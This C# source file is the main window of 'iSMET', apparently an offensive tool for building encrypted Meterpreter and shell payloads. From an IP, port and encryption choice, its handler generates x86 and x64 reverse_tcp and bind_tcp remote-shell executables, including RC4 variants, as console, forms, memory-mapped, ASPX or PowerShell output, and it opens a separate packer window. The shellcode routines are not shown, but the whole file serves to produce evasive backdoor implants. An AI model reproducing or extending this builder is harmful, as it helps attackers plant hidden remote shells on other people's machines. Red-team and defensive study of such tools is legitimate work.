using FirstFloor.ModernUI.Windows.Controls;
using System;
using System.IO;
using System.Windows;
using System.Windows.Controls;
using iSMET.CSharp.Collection;

namespace iSMET
{

    //    ██╗███████╗███╗   ███╗███████╗████████╗    ██╗   ██╗██████╗    ██╗
    //    ██║██╔════╝████╗ ████║██╔════╝╚══██╔══╝    ██║   ██║╚════██╗  ███║
    //    ██║███████╗██╔████╔██║█████╗     ██║       ██║   ██║ █████╔╝  ╚██║
    //    ██║╚════██║██║╚██╔╝██║██╔══╝     ██║       ╚██╗ ██╔╝██╔═══╝    ██║
    //    ██║███████║██║ ╚═╝ ██║███████╗   ██║        ╚████╔╝ ███████╗██╗██║
    //    ╚═╝╚══════╝╚═╝     ╚═╝╚══════╝   ╚═╝         ╚═══╝  ╚══════╝╚═╝╚═╝
    // iSMET - (A)Symmetric Meterpreter Encryption Tool v2.1
    // Author: @mindspoof - @PriviaSec

    public partial class Main : ModernWindow
    {
        private bool isBindTcp = false;
        private CSharpLibrary.CreateApplications createApp = new CSharpLibrary.CreateApplications();
		private CSharpLibrary.EncryptedMethodDword createDwordConsole = new CSharpLibrary.EncryptedMethodDword();
        public Main()
        {
            InitializeComponent();
        }
        private void btnBuilder_Click(object sender, RoutedEventArgs e)
        {
			if (!string.IsNullOrEmpty(txtIP.Text))
			{
				if (!string.IsNullOrEmpty(txtPort.Text))
				{
					if (cmbPayload.SelectedIndex == (int)Payload.x86_meterpreter_reverse_tcp)
                    {
                        if (cmbType.SelectedIndex == (int)ApplicationType.ConsoleApplication)
                        {
                            if (cmbShellCodeType.SelectedIndex == (int)ShellCodeType.ByteArray)
                            {
                                txtStatus.AppendText($"{Environment.NewLine}meterpreter/reverse_tcp payload generated.");
                                createApp.appType = (int)ApplicationType.ConsoleApplication;
							}
							else
							{
								txtStatus.AppendText($"{Environment.NewLine}meterpreter/reverse_tcp payload generated.");
                                createApp.appType = (int)ApplicationType.ConsoleApplication;
								createDwordConsole.NonEncryption(txtIP.Text, txtPort.Text, Int32.Parse(txtSleep.Text), Architecture.x86.ToString(), (int)ApplicationType.ConsoleApplication);
                                txtStatus.AppendText($"{Environment.NewLine}File Saved: {Directory.GetCurrentDirectory()}\\Saved\\{createApp.FileName}");
							}
						}
						else if(cmbType.SelectedIndex == (int)ApplicationType.FormApplication)
                        {
                            txtStatus.AppendText($"{Environment.NewLine}meterpreter/reverse_tcp payload generated.");
                            createApp.appType = (int)ApplicationType.FormApplication;
						}
                        else if (cmbType.SelectedIndex == (int)ApplicationType.ConsoleMemoryMapped)
                        {
							txtStatus.AppendText($"{Environment.NewLine}meterpreter/reverse_tcp payload generated with C# Mapped File Function.");
                            createApp.appType = (int)ApplicationType.ConsoleMemoryMapped;
						}
                        else if (cmbType.SelectedIndex == (int)ApplicationType.FormMemoryMapped)
                        {
                            createApp.appType = (int)ApplicationType.FormMemoryMapped;
                            txtStatus.AppendText($"{Environment.NewLine}meterpreter/reverse_tcp payload generated.");
						}
                        else if (cmbType.SelectedIndex == (int) ApplicationType.AspxExe)
                        {
                            if (cmbShellCodeType.SelectedIndex == (int)ShellCodeType.ByteArray)
                            {
                                txtStatus.AppendText($"{Environment.NewLine}meterpreter/reverse_tcp payload generated.");
                                createApp.appType = (int)ApplicationType.AspxExe;
                            }
                        }
						else if(cmbType.SelectedIndex == (int)ApplicationType.Powershell)
                        {
                            createApp.appType = (int)ApplicationType.Powershell;
							//createPowershell.ReverseTcp(txtIP.Text, txtPort.Text, cmbEncryption.SelectedIndex, int.Parse(txtSleep.Text));
							txtStatus.AppendText($"{Environment.NewLine}meterpreter/reverse_tcp payload generated.");
                                //txtStatus.AppendText($"{Environment.NewLine}File Saved: {Directory.GetCurrentDirectory()}\\Saved\\{createPowershell.FileName}");
                        }
                        createApp.ReverseTcp(txtIP.Text, txtPort.Text, cmbEncryption.SelectedIndex, int.Parse(txtSleep.Text));
                        txtStatus.AppendText($"{Environment.NewLine}File Saved: {Directory.GetCurrentDirectory()}\\Saved\\{createApp.FileName}");
                    }
					else if (cmbPayload.SelectedIndex == (int) Payload.x86_meterpreter_reverse_tcp_rc4)
                    {
                        if (cmbType.SelectedIndex == (int)ApplicationType.ConsoleApplication)
                        {
                            createApp.appType = (int)ApplicationType.ConsoleApplication;
                            txtStatus.AppendText($"{Environment.NewLine}meterpreter/reverse_tcp_rc4 payload generated.");
						}
                        else if (cmbType.SelectedIndex == (int) ApplicationType.FormApplication)
                        {
                            createApp.appType = (int)ApplicationType.FormApplication;
                            txtStatus.AppendText($"{Environment.NewLine}meterpreter/reverse_tcp_rc4 payload generated.");
                        }
                        else if (cmbType.SelectedIndex == (int)ApplicationType.ConsoleMemoryMapped)
                        {
                            createApp.appType = (int)ApplicationType.ConsoleMemoryMapped;
                            txtStatus.AppendText($"{Environment.NewLine}meterpreter/reverse_tcp_rc4 payload generated with C# Mapped File Function.");
                        }
                        else if (cmbType.SelectedIndex == (int)ApplicationType.FormMemoryMapped)
                        {
                            createApp.appType = (int)ApplicationType.FormMemoryMapped;
                            txtStatus.AppendText($"{Environment.NewLine}meterpreter/reverse_tcp_rc4 payload generated.");
                        }
                        else if (cmbType.SelectedIndex == (int)ApplicationType.AspxExe)
                        {
                            createApp.appType = (int)ApplicationType.AspxExe;
                            txtStatus.AppendText($"{Environment.NewLine}meterpreter/reverse_tcp_rc4 payload generated with C# Mapped File Function.");
                        }
                        createApp.ReverseTcpRc4(txtIP.Text, txtPort.Text, cmbEncryption.SelectedIndex, int.Parse(txtSleep.Text));
                        txtStatus.AppendText($"{Environment.NewLine}RC4 Password = iSMET");
                        txtStatus.AppendText($"{Environment.NewLine}File Saved: {Directory.GetCurrentDirectory()}\\Saved\\{createApp.FileName}");
                    }
                    else if (cmbPayload.SelectedIndex == (int)Payload.x86_shell_reverse_tcp)
                    {
                        if (cmbType.SelectedIndex == (int)ApplicationType.ConsoleApplication)
                        {
                            createApp.appType = (int)ApplicationType.ConsoleApplication;
                            txtStatus.AppendText($"{Environment.NewLine}meterpreter/shell/reverse_tcp payload generated.");
                        }
                        else if (cmbType.SelectedIndex == (int)ApplicationType.FormApplication)
						{
                            createApp.appType = (int)ApplicationType.FormApplication;
                            txtStatus.AppendText($"{Environment.NewLine}shell/reverse_tcp payload generated.");
                        }
                        else if (cmbType.SelectedIndex == (int)ApplicationType.ConsoleMemoryMapped)
                        {
                            createApp.appType = (int)ApplicationType.ConsoleMemoryMapped;
                            txtStatus.AppendText($"{Environment.NewLine}shell/reverse_tcp payload generated with C# Mapped File Function.");
                        }
                        else if (cmbType.SelectedIndex == (int)ApplicationType.FormMemoryMapped)
                        {
                            createApp.appType = (int)ApplicationType.FormMemoryMapped;
                            txtStatus.AppendText($"{Environment.NewLine}shell/reverse_tcp payload generated with C# Mapped File Function.");
                        }
                        else if (cmbType.SelectedIndex == (int)ApplicationType.AspxExe)
                        {
                            createApp.appType = (int)ApplicationType.AspxExe;
                            txtStatus.AppendText($"{Environment.NewLine}shell/reverse_tcp payload generated with C# Mapped File Function.");
                        }
                        createApp.ShellReverseTcp(txtIP.Text, txtPort.Text, cmbEncryption.SelectedIndex, int.Parse(txtSleep.Text));
                        txtStatus.AppendText($"{Environment.NewLine}File Saved: {Directory.GetCurrentDirectory()}\\Saved\\{createApp.FileName}");
                    }
                    else if (cmbPayload.SelectedIndex == (int) Payload.x86_shell_reverse_tcp_rc4)
                    {
                        if (cmbType.SelectedIndex == (int) ApplicationType.ConsoleApplication)
                        {
                            createApp.appType = (int)ApplicationType.ConsoleApplication;
                            txtStatus.AppendText($"{Environment.NewLine}shell/reverse_tcp_rc4 payload generated.");
                        }
                        else if (cmbType.SelectedIndex == (int)ApplicationType.FormApplication)
                        {
                            createApp.appType = (int)ApplicationType.FormApplication;
                            txtStatus.AppendText($"{Environment.NewLine}shell/reverse_tcp_rc4 payload generated.");
                        }
                        else if (cmbType.SelectedIndex == (int)ApplicationType.ConsoleMemoryMapped)
                        {
                            createApp.appType = (int)ApplicationType.ConsoleMemoryMapped;
                            txtStatus.AppendText($"{Environment.NewLine}shell/reverse_tcp_rc4 payload generated with C# Mapped File Function.");
                        }
                        else if (cmbType.SelectedIndex == (int)ApplicationType.FormMemoryMapped)
                        {
                            createApp.appType = (int)ApplicationType.FormMemoryMapped;
                            txtStatus.AppendText($"{Environment.NewLine}shell/reverse_tcp_rc4 payload generated with C# Mapped File Function.");
                        }
                        else if (cmbType.SelectedIndex == (int)ApplicationType.AspxExe)
                        {
                            createApp.appType = (int)ApplicationType.AspxExe;
                            txtStatus.AppendText($"{Environment.NewLine}shell/reverse_tcp_rc4 payload generated.");
                        }
                        createApp.ShellReverseTcpRc4(txtIP.Text, txtPort.Text, cmbEncryption.SelectedIndex, int.Parse(txtSleep.Text));
                        txtStatus.AppendText($"{Environment.NewLine}RC4 Password = iSMET");
                        txtStatus.AppendText($"{Environment.NewLine}File Saved: {Directory.GetCurrentDirectory()}\\Saved\\{createApp.FileName}");
                    }
                    else if (cmbPayload.SelectedIndex == (int) Payload.x64_meterpreter_reverse_tcp)
                    {
                        if (cmbType.SelectedIndex == (int)ApplicationType.ConsoleApplication)
                        {
                            createApp.appType = (int)ApplicationType.ConsoleApplication;
                            txtStatus.AppendText($"{Environment.NewLine}x64/meterpreter/reverse_tcp payload generated.");
                        }
                        else if (cmbType.SelectedIndex == (int)ApplicationType.FormApplication)
                        {
                            createApp.appType = (int)ApplicationType.FormApplication;
                            txtStatus.AppendText($"{Environment.NewLine}x64/meterpreter/reverse_tcp payload generated.");
                        }
                        else if (cmbType.SelectedIndex == (int)ApplicationType.ConsoleMemoryMapped)
                        {
                            createApp.appType = (int)ApplicationType.ConsoleMemoryMapped;
                            txtStatus.AppendText($"{Environment.NewLine}x64/meterpreter/reverse_tcp payload generated with C# Mapped File Function.");
                        }
                        else if (cmbType.SelectedIndex == (int)ApplicationType.FormMemoryMapped)
                        {
                            createApp.appType = (int)ApplicationType.FormMemoryMapped;
                            txtStatus.AppendText($"{Environment.NewLine}x64/meterpreter/reverse_tcp payload generated with C# Mapped File Function.");
                        }
                        else if (cmbType.SelectedIndex == (int)ApplicationType.AspxExe)
                        {
                            createApp.appType = (int)ApplicationType.AspxExe;
                            txtStatus.AppendText($"{Environment.NewLine}x64/meterpreter/reverse_tcp payload generated.");
                        }
                        createApp.x64ReverseTcp(txtIP.Text, txtPort.Text, cmbEncryption.SelectedIndex, int.Parse(txtSleep.Text));
                        txtStatus.AppendText($"{Environment.NewLine}File Saved: {Directory.GetCurrentDirectory()}\\Saved\\{createApp.FileName}");
                    }
                    else if (cmbPayload.SelectedIndex == (int) Payload.x64_meterpreter_reverse_tcp_rc4)
                    {
                        if (cmbType.SelectedIndex == (int)ApplicationType.ConsoleApplication)
                        {
                            createApp.appType = (int)ApplicationType.ConsoleApplication;
                            txtStatus.AppendText($"{Environment.NewLine}x64/meterpreter/reverse_tcp_rc4 payload generated.");
                        }
                        else if (cmbType.SelectedIndex == (int)ApplicationType.FormApplication)
                        {
                            createApp.appType = (int)ApplicationType.FormApplication;
                            txtStatus.AppendText($"{Environment.NewLine}x64/meterpreter/reverse_tcp_rc4 payload generated.");
                        }
                        else if (cmbType.SelectedIndex == (int)ApplicationType.ConsoleMemoryMapped)
                        {
                            createApp.appType = (int)ApplicationType.ConsoleMemoryMapped;
                            txtStatus.AppendText($"{Environment.NewLine}x64/meterpreter/reverse_tcp_rc4 payload generated with C# Mapped File Function.");
                        }
                        else if (cmbType.SelectedIndex == (int)ApplicationType.FormMemoryMapped)
                        {
                            createApp.appType = (int)ApplicationType.FormMemoryMapped;
                            txtStatus.AppendText($"{Environment.NewLine}x64/meterpreter/reverse_tcp_rc4 payload generated.");
                        }
                        else if (cmbType.SelectedIndex == (int)ApplicationType.AspxExe)
                        {
                            createApp.appType = (int)ApplicationType.AspxExe;
                            txtStatus.AppendText($"{Environment.NewLine}x64/meterpreter/reverse_tcp_rc4 payload generated.");
                        }
                        createApp.x64ReverseTcpRc4(txtIP.Text, txtPort.Text, cmbEncryption.SelectedIndex, int.Parse(txtSleep.Text));
                        txtStatus.AppendText($"{Environment.NewLine}RC4 Password = iSMET");
                        txtStatus.AppendText($"{Environment.NewLine}File Saved: {Directory.GetCurrentDirectory()}\\Saved\\{createApp.FileName}");
                    }
                    else if (cmbPayload.SelectedIndex == (int) Payload.x64_shell_reverse_tcp)
                    {
                        if (cmbType.SelectedIndex == (int)ApplicationType.ConsoleApplication)
                        {
                            createApp.appType = (int)ApplicationType.ConsoleApplication;
                            txtStatus.AppendText($"{Environment.NewLine}x64/shell/reverse_tcp payload generated.");
                        }
                        else if (cmbType.SelectedIndex == (int)ApplicationType.FormApplication)
                        {
                            createApp.appType = (int)ApplicationType.FormApplication;
                            txtStatus.AppendText($"{Environment.NewLine}x64/shell/reverse_tcp payload generated.");
                        }
                        else if (cmbType.SelectedIndex == (int)ApplicationType.ConsoleMemoryMapped)
                        {
                            createApp.appType = (int)ApplicationType.ConsoleMemoryMapped;
                            txtStatus.AppendText($"{Environment.NewLine}x64/shell/reverse_tcp generated with C# Mapped File Function.");
                        }
                        else if (cmbType.SelectedIndex == (int)ApplicationType.FormMemoryMapped)
                        {
                            createApp.appType = (int)ApplicationType.FormMemoryMapped;
                            txtStatus.AppendText($"{Environment.NewLine}x64/shell/reverse_tcp payload generated with C# Mapped File Function.");
                        }
                        else if (cmbType.SelectedIndex == (int)ApplicationType.AspxExe)
                        {
                            createApp.appType = (int)ApplicationType.AspxExe;
                            txtStatus.AppendText($"{Environment.NewLine}x64/shell/reverse_tcp payload generated.");
                        }
                        createApp.x64ShellReverseTcp(txtIP.Text, txtPort.Text, cmbEncryption.SelectedIndex, int.Parse(txtSleep.Text));
                        txtStatus.AppendText($"{Environment.NewLine}File Saved: {Directory.GetCurrentDirectory()}\\Saved\\{createApp.FileName}");
                    }
                    else if (cmbPayload.SelectedIndex == (int)Payload.x64_shell_reverse_tcp_rc4)
                    {
                        if (cmbType.SelectedIndex == (int)ApplicationType.ConsoleApplication)
                        {
                            createApp.appType = (int)ApplicationType.ConsoleApplication;
                            txtStatus.AppendText($"{Environment.NewLine}x64/shell/reverse_tcp_rc4 payload generated.");
                        }
                        else if (cmbType.SelectedIndex == (int)ApplicationType.FormApplication)
                        {
                            createApp.appType = (int)ApplicationType.FormApplication;
                            txtStatus.AppendText($"{Environment.NewLine}x64/shell/reverse_tcp_rc4 payload generated.");
                        }
                        else if (cmbType.SelectedIndex == (int)ApplicationType.ConsoleMemoryMapped)
                        {
                            createApp.appType = (int)ApplicationType.ConsoleMemoryMapped;
                            txtStatus.AppendText($"{Environment.NewLine}x64/shell/reverse_tcp_rc4 generated with C# Mapped File Function.");
                        }
                        else if (cmbType.SelectedIndex == (int)ApplicationType.FormMemoryMapped)
                        {
                            createApp.appType = (int)ApplicationType.FormMemoryMapped;
                            txtStatus.AppendText($"{Environment.NewLine}x64/shell/reverse_tcp_rc4 payload generated with C# Mapped File Function.");
                        }
                        else if (cmbType.SelectedIndex == (int)ApplicationType.AspxExe)
                        {
                            createApp.appType = (int)ApplicationType.AspxExe;
                            txtStatus.AppendText($"{Environment.NewLine}x64/shell/reverse_tcp_rc4 payload generated.");
                        }
                        createApp.x64ShellReverseTcpRc4(txtIP.Text, txtPort.Text, cmbEncryption.SelectedIndex, int.Parse(txtSleep.Text));
                        txtStatus.AppendText($"{Environment.NewLine}File Saved: {Directory.GetCurrentDirectory()}\\Saved\\{createApp.FileName}");
                    }
                }
				else
				{
					txtStatus.AppendText($"{Environment.NewLine}Port can not be empty");
				}
			}
			else
			{
				if (isBindTcp)
				{
					if (cmbPayload.SelectedIndex == (int)Payload.x86_meterpreter_bind_tcp)
					{
                        if (cmbType.SelectedIndex == (int) ApplicationType.ConsoleApplication)
                        {
                            createApp.appType = (int)ApplicationType.ConsoleApplication;
                            txtStatus.AppendText($"{Environment.NewLine}meterpreter/bind_tcp payload generated.");
                        }
                        else if (cmbType.SelectedIndex == (int)ApplicationType.FormApplication)
                        {
                            createApp.appType = (int)ApplicationType.FormApplication;
                            txtStatus.AppendText($"{Environment.NewLine}meterpreter/bind_tcp payload generated.");
                        }
                        else if (cmbType.SelectedIndex == (int)ApplicationType.ConsoleMemoryMapped)
                        {
                            createApp.appType = (int)ApplicationType.ConsoleMemoryMapped;
                            txtStatus.AppendText($"{Environment.NewLine}meterpreter/bind_tcp payload generated with C# Mapped File Function.");
                        }
                        else if (cmbType.SelectedIndex == (int)ApplicationType.FormMemoryMapped)
                        {
                            createApp.appType = (int)ApplicationType.FormMemoryMapped;
                            txtStatus.AppendText($"{Environment.NewLine}meterpreter/bind_tcp payload generated with C# Mapped File Function.");
                        }
                        else if (cmbType.SelectedIndex == (int)ApplicationType.AspxExe)
                        {
                            createApp.appType = (int)ApplicationType.AspxExe;
                            txtStatus.AppendText($"{Environment.NewLine}meterpreter/bind_tcp payload generated.");
                        }
                        createApp.BindTcp(txtPort.Text, cmbEncryption.SelectedIndex, int.Parse(txtSleep.Text));
                        txtStatus.AppendText($"{Environment.NewLine}File Saved: {Directory.GetCurrentDirectory()}\\Saved\\{createApp.FileName}");
                    }
                    else if (cmbPayload.SelectedIndex == (int) Payload.x86_shell_bind_tcp)
                    {
                        if (cmbType.SelectedIndex == (int)ApplicationType.ConsoleApplication)
                        {
                            createApp.appType = (int)ApplicationType.ConsoleApplication;
                            txtStatus.AppendText($"{Environment.NewLine}shell/bind_tcp payload generated.");
                        }
                        else if (cmbType.SelectedIndex == (int) ApplicationType.FormApplication)
                        {
                            createApp.appType = (int)ApplicationType.FormApplication;
                            txtStatus.AppendText($"{Environment.NewLine}shell/bind_tcp payload generated.");
                        }
                        else if (cmbType.SelectedIndex == (int)ApplicationType.ConsoleMemoryMapped)
                        {
                            createApp.appType = (int)ApplicationType.ConsoleMemoryMapped;
                            txtStatus.AppendText($"{Environment.NewLine}shell/bind_tcp payload generated with C# Mapped File Function.");
                        }
                        else if (cmbType.SelectedIndex == (int)ApplicationType.FormMemoryMapped)
                        {
                            createApp.appType = (int)ApplicationType.FormMemoryMapped;
                            txtStatus.AppendText($"{Environment.NewLine}shell/bind_tcp payload generated with C# Mapped File Function.");
                        }
                        else if (cmbType.SelectedIndex == (int)ApplicationType.AspxExe)
                        {
                            createApp.appType = (int)ApplicationType.AspxExe;
                            txtStatus.AppendText($"{Environment.NewLine}shell/bind_tcp payload generated.");
                        }
                        createApp.ShellBindTcp(txtPort.Text, cmbEncryption.SelectedIndex, int.Parse(txtSleep.Text));
                        txtStatus.AppendText($"{Environment.NewLine}File Saved: {Directory.GetCurrentDirectory()}\\Saved\\{createApp.FileName}");
                    }
                    else if (cmbPayload.SelectedIndex == (int) Payload.x86_shell_bind_tcp_rc4)
                    {
                        if (cmbType.SelectedIndex == (int)ApplicationType.ConsoleApplication)
                        {
                            createApp.appType = (int)ApplicationType.ConsoleApplication;
                            txtStatus.AppendText($"{Environment.NewLine}shell/bind_tcp_rc4 payload generated.");
                        }
                        else if (cmbType.SelectedIndex == (int) ApplicationType.FormApplication)
                        {
                            createApp.appType = (int)ApplicationType.FormApplication;
                            txtStatus.AppendText($"{Environment.NewLine}shell/bind_tcp_rc4 payload generated.");
                        }
                        else if (cmbType.SelectedIndex == (int)ApplicationType.ConsoleMemoryMapped)
                        {
                            createApp.appType = (int)ApplicationType.ConsoleMemoryMapped;
                            txtStatus.AppendText($"{Environment.NewLine}shell/bind_tcp_rc4 payload generated with C# Mapped File Function.");
                        }
                        else if (cmbType.SelectedIndex == (int)ApplicationType.FormMemoryMapped)
                        {
                            createApp.appType = (int)ApplicationType.FormMemoryMapped;
                            txtStatus.AppendText($"{Environment.NewLine}shell/bind_tcp_rc4 payload generated with C# Mapped File Function.");
                        }
                        else if (cmbType.SelectedIndex == (int)ApplicationType.AspxExe)
                        {
                            createApp.appType = (int)ApplicationType.AspxExe;
                            txtStatus.AppendText($"{Environment.NewLine}shell/bind_tcp_rc4 payload generated.");
                        }
                        createApp.ShellBindTcpRc4(txtPort.Text, cmbEncryption.SelectedIndex, int.Parse(txtSleep.Text));
                        txtStatus.AppendText($"{Environment.NewLine}RC4 Password = iSMET");
                        txtStatus.AppendText($"{Environment.NewLine}File Saved: {Directory.GetCurrentDirectory()}\\Saved\\{createApp.FileName}");
                    }
                    else if (cmbPayload.SelectedIndex == (int) Payload.x64_meterpreter_bind_tcp)
                    {
                        if (cmbType.SelectedIndex == (int) ApplicationType.ConsoleApplication)
                        {
                            createApp.appType = (int)ApplicationType.ConsoleApplication;
                            txtStatus.AppendText($"{Environment.NewLine}x64/meterpreter/bind_tcp payload generated.");
                        }
                        else if (cmbType.SelectedIndex == (int) ApplicationType.FormApplication)
                        {
                            createApp.appType = (int)ApplicationType.FormApplication;
                            txtStatus.AppendText($"{Environment.NewLine}x64/meterpreter/bind_tcp payload generated.");
                        }
                        else if (cmbType.SelectedIndex == (int)ApplicationType.ConsoleMemoryMapped)
                        {
                            createApp.appType = (int)ApplicationType.ConsoleMemoryMapped;
                            txtStatus.AppendText($"{Environment.NewLine}x64/meterpreter/bind_tcp payload generated with C# Mapped File Function.");
                        }
                        else if (cmbType.SelectedIndex == (int)ApplicationType.FormMemoryMapped)
                        {
                            createApp.appType = (int)ApplicationType.FormMemoryMapped;
                            txtStatus.AppendText($"{Environment.NewLine}x64/meterpreter/bind_tcp payload generated with C# Mapped File Function.");
                        }
                        else if (cmbType.SelectedIndex == (int)ApplicationType.AspxExe)
                        {
                            createApp.appType = (int)ApplicationType.AspxExe;
                            txtStatus.AppendText($"{Environment.NewLine}x64/meterpreter/bind_tcp payload generated.");
                        }
                        createApp.x64BindTcp(txtPort.Text, cmbEncryption.SelectedIndex, int.Parse(txtSleep.Text));
                        txtStatus.AppendText($"{Environment.NewLine}File Saved: {Directory.GetCurrentDirectory()}\\Saved\\{createApp.FileName}");
                    }
                    else if (cmbPayload.SelectedIndex == (int) Payload.x64_shell_bind_tcp)
                    {
                        if (cmbType.SelectedIndex == (int) ApplicationType.ConsoleApplication)
                        {
                            createApp.appType = (int)ApplicationType.ConsoleApplication;
                            txtStatus.AppendText($"{Environment.NewLine}x64/shell/bind_tcp payload generated.");
                        }
                        else if (cmbType.SelectedIndex == (int) ApplicationType.FormApplication)
                        {
                            createApp.appType = (int)ApplicationType.FormApplication;
                            txtStatus.AppendText($"{Environment.NewLine}x64/shell/bind_tcp payload generated.");
                        }
                        else if (cmbType.SelectedIndex == (int)ApplicationType.ConsoleMemoryMapped)
                        {
                            createApp.appType = (int)ApplicationType.ConsoleMemoryMapped;
                            txtStatus.AppendText($"{Environment.NewLine}x64/shell/bind_tcp payload generated with C# Mapped File Function.");
                        }
                        else if (cmbType.SelectedIndex == (int)ApplicationType.FormMemoryMapped)
                        {
                            createApp.appType = (int)ApplicationType.FormMemoryMapped;
                            txtStatus.AppendText($"{Environment.NewLine}x64/shell/bind_tcp payload generated with C# Mapped File Function.");
                        }
                        else if (cmbType.SelectedIndex == (int)ApplicationType.AspxExe)
                        {
                            createApp.appType = (int)ApplicationType.AspxExe;
                            txtStatus.AppendText($"{Environment.NewLine}x64/shell/bind_tcp payload generated.");
                        }
                        createApp.x64ShellBindTcp(txtPort.Text, cmbEncryption.SelectedIndex, int.Parse(txtSleep.Text));
                        txtStatus.AppendText($"{Environment.NewLine}File Saved: {Directory.GetCurrentDirectory()}\\Saved\\{createApp.FileName}");
                    }
                    else if (cmbPayload.SelectedIndex == (int)Payload.x64_shell_bind_tcp_rc4)
                    {
                        if (cmbType.SelectedIndex == (int)ApplicationType.ConsoleApplication)
                        {
                            createApp.appType = (int)ApplicationType.ConsoleApplication;
                            txtStatus.AppendText($"{Environment.NewLine}x64/shell/reverse_tcp_rc4 payload generated.");
                        }
                        else if (cmbType.SelectedIndex == (int)ApplicationType.FormApplication)
                        {
                            createApp.appType = (int)ApplicationType.FormApplication;
                            txtStatus.AppendText($"{Environment.NewLine}x64/shell/reverse_tcp_rc4 payload generated.");
                        }
                        else if (cmbType.SelectedIndex == (int)ApplicationType.ConsoleMemoryMapped)
                        {
                            createApp.appType = (int)ApplicationType.ConsoleMemoryMapped;
                            txtStatus.AppendText($"{Environment.NewLine}x64/shell/reverse_tcp_rc4 generated with C# Mapped File Function.");
                        }
                        else if (cmbType.SelectedIndex == (int)ApplicationType.FormMemoryMapped)
                        {
                            createApp.appType = (int)ApplicationType.FormMemoryMapped;
                            txtStatus.AppendText($"{Environment.NewLine}x64/shell/reverse_tcp_rc4 payload generated with C# Mapped File Function.");
                        }
                        else if (cmbType.SelectedIndex == (int)ApplicationType.AspxExe)
                        {
                            createApp.appType = (int)ApplicationType.AspxExe;
                            txtStatus.AppendText($"{Environment.NewLine}x64/shell/reverse_tcp_rc4 payload generated.");
                        }
                        createApp.x64ShellBindTcpRc4(txtPort.Text, cmbEncryption.SelectedIndex, int.Parse(txtSleep.Text));
                        txtStatus.AppendText($"{Environment.NewLine}File Saved: {Directory.GetCurrentDirectory()}\\Saved\\{createApp.FileName}");
                    }
                }
				else
				{
					txtStatus.AppendText($"{Environment.NewLine}IP address can not be empty");
				}
			}
		}
        private void ModernWindow_Loaded(object sender, RoutedEventArgs e)
        {
            cmbPayload.SelectedIndex = 0;
            cmbEncryption.SelectedIndex = 0;
            cmbType.SelectedIndex = 0;
            cmbShellCodeType.SelectedIndex = 0;
            txtStatus.Text = $"iSMET - (A)Symmetric Meterpreter Encryption Tool{Environment.NewLine}Eyüp Çelik - @mindspoof - http://eyupcelik.com.tr{Environment.NewLine}Privia Security @Priviasec - https://priviasecurity.com";
        }
        private void btnPacker_Click(object sender, RoutedEventArgs e)
        {
			var ismetPacker = new Packer();
			ismetPacker.ShowDialog();
        }
        private void cmbPayload_SelectionChanged(object sender, SelectionChangedEventArgs e)
        {
            if (cmbPayload.SelectedIndex == (int)Payload.x86_shell_bind_tcp || cmbPayload.SelectedIndex == (int)Payload.x64_shell_bind_tcp_rc4 || cmbPayload.SelectedIndex == (int)Payload.x64_meterpreter_bind_tcp || cmbPayload.SelectedIndex == (int)Payload.x64_shell_bind_tcp || cmbPayload.SelectedIndex == (int)Payload.x86_meterpreter_bind_tcp || cmbPayload.SelectedIndex == (int)Payload.x86_shell_bind_tcp_rc4)
            {
                txtIP.Text = string.Empty;
                txtIP.IsReadOnly = true;
                isBindTcp = true;
            }
            else
            {
                txtIP.IsReadOnly = false;
                isBindTcp = false;
            }
		}
    }
}
